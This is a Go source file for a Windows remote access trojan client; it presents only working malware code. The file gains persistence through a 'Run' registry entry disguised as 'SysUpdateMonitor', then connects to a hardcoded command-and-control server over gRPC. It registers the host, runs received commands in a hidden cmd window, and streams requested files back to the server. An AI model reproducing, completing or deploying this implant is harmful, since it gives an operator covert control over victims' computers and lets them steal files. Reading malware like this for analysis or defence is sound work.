package main

import (
	"bufio"
	"context"
	"io"
	"os"
	"os/exec"
	"syscall"
	"time"

	"rat/internal/crypto"
	pb "rat/internal/proto"

	"github.com/google/uuid"
	"golang.org/x/sys/windows/registry"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/proto"
)

const (
	C2         = "192.168.1.182:50051"
	CHUNK_SIZE = 512 * 1024
)

var (
	ClientId   = uuid.New().String()
	SessionKey []byte
)

func ensurePersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	if val, _, err := k.GetStringValue("SysUpdateMonitor"); err != nil || val != exe {
		k.SetStringValue("SysUpdateMonitor", exe)
	}
}

func runClient() {
	conn, err := grpc.NewClient(C2, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return
	}
	defer conn.Close()
	client := pb.NewClientServiceClient(conn)
	if !handshake(client) {
		return
	}
	for {
		cntx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		envelope, err := client.GetTask(cntx, &pb.PollRequest{ClientId: ClientId})
		cancel()
		if err != nil {
			return
		}
		if len(envelope.EncryptedData) > 0 {
			processTask(client, envelope)
		}
		time.Sleep(1 * time.Second)
	}
}

func handshake(client pb.ClientServiceClient) bool {
	priv, pub, err := crypto.GenKeyPair()
	if err != nil {
		return false
	}
	hostname, _ := os.Hostname()
	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		ClientId: ClientId, Hostname: hostname, Os: "Windows", PublicKey: pub,
	})
	if err != nil {
		return false
	}
	SessionKey, err = crypto.GetAESKey(priv, resp.PublicKey)
	return err == nil
}

func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
	data, err := crypto.Decrypt(env.EncryptedData, env.InitV, SessionKey)
	if err != nil {
		return
	}
	var task pb.Task
	proto.Unmarshal(data, &task)
	stream, err := client.SendResult(context.Background())
	if err != nil {
		return
	}
	switch task.Type {
	case "cmd":
		cmd := exec.Command("cmd", "/C", task.Command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		sendResult(stream, task.TaskId, task.Command, string(out), "")
	case "download":
		sendFile(stream, task.TaskId, task.Command, task.FilePath)
	}
	stream.CloseAndRecv()
}

func sendFile(stream pb.ClientService_SendResultClient, taskId, command, path string) {
	f, err := os.Open(path)
	if err != nil {
		sendResult(stream, taskId, command, "", err.Error())
		return
	}
	defer f.Close()
	buf := make([]byte, CHUNK_SIZE)
	reader := bufio.NewReader(f)
	isLast := false
	for !isLast {
		n, err := reader.Read(buf)
		if err != nil && err != io.EOF {
			sendResult(stream, taskId, command, "", err.Error())
			return
		}

		isLast = (err == io.EOF || n == 0)

		if n == 0 && isLast {
			res := &pb.TaskResult{
				TaskId:    taskId,
				Command:   command,
				FileName:  path,
				FileChunk: []byte{},
				IsLast:    true,
			}
			data, _ := proto.Marshal(res)
			enc, initV, _ := crypto.Encrypt(data, SessionKey)
			stream.Send(&pb.ResultEnvelope{
				ClientId: ClientId, EncryptedData: enc, InitV: initV,
			})
			break
		}

		res := &pb.TaskResult{
			TaskId:    taskId,
			Command:   command,
			FileName:  path,
			FileChunk: buf[:n],
			IsLast:    isLast,
		}
		data, _ := proto.Marshal(res)
		enc, initV, _ := crypto.Encrypt(data, SessionKey)
		stream.Send(&pb.ResultEnvelope{
			ClientId: ClientId, EncryptedData: enc, InitV: initV,
		})
	}
}

func sendResult(stream pb.ClientService_SendResultClient, taskId, command, out, errStr string) {
	res := &pb.TaskResult{
		TaskId:  taskId,
		Command: command,
		Output:  out,
		Error:   errStr,
	}
	data, _ := proto.Marshal(res)
	enc, initV, _ := crypto.Encrypt(data, SessionKey)
	stream.Send(&pb.ResultEnvelope{
		ClientId: ClientId, EncryptedData: enc, InitV: initV,
	})
}

func main() {
	ensurePersistence()

	for {
		runClient()
		time.Sleep(5 * time.Second)
	}
}
